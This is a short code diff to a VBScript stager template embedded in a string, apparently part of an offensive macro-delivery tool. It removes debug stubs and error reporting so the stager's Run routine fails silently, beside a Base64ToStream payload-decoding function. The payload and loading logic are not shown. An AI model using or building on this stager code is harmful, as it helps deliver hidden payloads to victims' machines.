@@ -223,11 +223,6 @@ VBS = \
 
 'This Stager should run on x86 as well as x64
 
-Sub Debug(s)
-End Sub
-Sub SetVersion
-End Sub
-
 Function Base64ToStream(b)
   Dim enc, length, ba, transform, ms
   Set enc = CreateObject("System.Text.ASCIIEncoding")
@@ -403,12 +398,7 @@ Sub Run()
 End Sub
 
 Function MacroMeter()
-    SetVersion
     On Error Resume Next
     Run
-    If Err.Number <> 0 Then
-      Debug Err.Description
-      Err.Clear
-    End If
 End Function
 """
